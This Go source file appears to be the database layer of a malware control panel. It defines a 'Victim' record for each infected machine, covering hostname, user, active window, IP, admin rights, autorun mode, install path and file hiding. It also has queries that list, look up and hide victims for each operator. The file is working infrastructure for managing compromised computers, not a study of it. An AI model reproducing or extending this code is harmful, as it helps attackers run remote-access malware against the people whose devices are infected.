package storage

import (
	"context"
	"database/sql"
	"errors"
	"strings"
	"time"
)

type Victim struct {
	ID         string `json:"id"`
	Country    string `json:"country"`
	DeviceType string `json:"deviceType"`
	Hostname   string `json:"hostname"`
	User       string `json:"user"`
	Window     string `json:"window"`
	IP         string `json:"ip"`
	Comment    string `json:"comment"`
	BuildID    string `json:"buildId"`
	OS         string `json:"os"`
	CPU        string `json:"cpu"`
	GPU        string `json:"gpu"`
	RAM        string `json:"ram"`
	Admin      bool   `json:"admin"`

	LastActive time.Time `json:"last_active"`
	Online     bool      `json:"online"`
	Owner      string    `json:"owner"`

	BuildVersion        string `json:"version"`
	StartupDelaySeconds int    `json:"startupDelaySeconds"`
	AutorunMode         string `json:"autorunMode"`
	InstallPath         string `json:"installPath"`
	HideFilesEnabled    bool   `json:"hideFilesEnabled"`
}

func (d *DB) ListVictimsForOwner(owner string, limit, offset int) ([]*Victim, error) {
	owner = strings.ToLower(strings.TrimSpace(owner))
	if owner == "" {
		return nil, errors.New("empty owner")
	}
	if d == nil || d.SQL() == nil {
		return nil, errors.New("db is nil")
	}

	if limit <= 0 {
		limit = 500
	}
	if limit > 2000 {
		limit = 2000
	}
	if offset < 0 {
		offset = 0
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	rows, err := d.SQL().QueryContext(ctx, `
		SELECT `+victimColumns+`
		FROM victims
		WHERE LOWER(COALESCE(owner, '')) = $1
			AND NOT EXISTS (
				SELECT 1 FROM hidden_victims hv
				WHERE hv.owner = $1 AND hv.victim_id = victims.id
			)
		ORDER BY last_active DESC
		LIMIT $2 OFFSET $3
	`, owner, limit, offset)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	out := make([]*Victim, 0)
	for rows.Next() {
		v, err := scanVictimRow(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, v)
	}

	if err := rows.Err(); err != nil {
		return nil, err
	}
	return out, nil
}

func (d *DB) GetVictimOwnerByID(id string) (string, bool, error) {
	id = strings.TrimSpace(id)
	if id == "" {
		return "", false, nil
	}
	if d == nil || d.SQL() == nil {
		return "", false, errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var owner string
	err := d.SQL().QueryRowContext(ctx, `SELECT COALESCE(owner, '') FROM victims WHERE id = $1`, id).Scan(&owner)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return "", false, nil
		}
		return "", false, err
	}
	owner = strings.ToLower(strings.TrimSpace(owner))
	if owner == "" {
		return "", false, nil
	}
	return owner, true, nil
}

func (d *DB) GetVictimByID(id string) (*Victim, bool, error) {
	id = strings.TrimSpace(id)
	if id == "" {
		return nil, false, nil
	}
	if d == nil || d.SQL() == nil {
		return nil, false, errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var v Victim
	row := d.SQL().QueryRowContext(ctx, `
		SELECT `+victimColumns+`
		FROM victims WHERE id = $1
	`, id)
	vp, err := scanVictimRow(row)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return nil, false, nil
		}
		return nil, false, err
	}

	v = *vp
	return &v, true, nil
}

func (d *DB) HideVictimForOwner(owner, victimID string) error {
	owner = strings.ToLower(strings.TrimSpace(owner))
	victimID = strings.TrimSpace(victimID)
	if owner == "" || victimID == "" {
		return errors.New("owner or victim_id is empty")
	}
	if d == nil || d.SQL() == nil {
		return errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := d.SQL().ExecContext(ctx, `
		INSERT INTO hidden_victims (owner, victim_id)
		VALUES ($1, $2)
		ON CONFLICT (owner, victim_id) DO NOTHING
	`, owner, victimID)
	return err
}
